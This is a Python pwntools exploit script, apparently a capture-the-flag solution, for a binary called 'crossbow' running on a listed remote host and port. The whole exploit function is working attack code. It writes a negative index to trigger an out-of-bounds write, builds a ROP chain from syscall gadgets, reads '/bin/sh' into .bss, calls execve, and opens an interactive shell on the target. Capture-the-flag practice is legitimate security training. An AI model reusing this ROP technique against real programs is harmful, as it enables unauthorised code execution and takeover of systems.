#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './crossbow'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "94.237.57.7", 56610

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    b *training+126
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    bin_sh = "/bin/sh\x00"
    syscall = next(elf.search(asm("syscall ; ret")))
    syscall2 = next(elf.search(asm("xor esi, esi ; mov rax, rbx ; syscall")))
    xor_edx_edx_mov_rax_rdx = next(elf.search(asm("xor edx, edx ; mov rax, rdx ; ret")))
    rop = ROP(elf)

    #Syscall Read
    rop.raw(xor_edx_edx_mov_rax_rdx)
    rop.call(syscall, [0, elf.bss(), len(bin_sh) + 1])
    rop.raw(xor_edx_edx_mov_rax_rdx)

    #Syscall Execve
    rop.rbx = constants.SYS_execve
    rop.call(syscall2, [elf.bss()])
    offset = 8
    payload = flat({offset: [rop.chain()]})

    io.sendlineafter(": ", b"-2")
    io.sendlineafter("> ", payload)
    io.send(bin_sh)
    io.interactive()

if __name__ == '__main__':
    exploit()
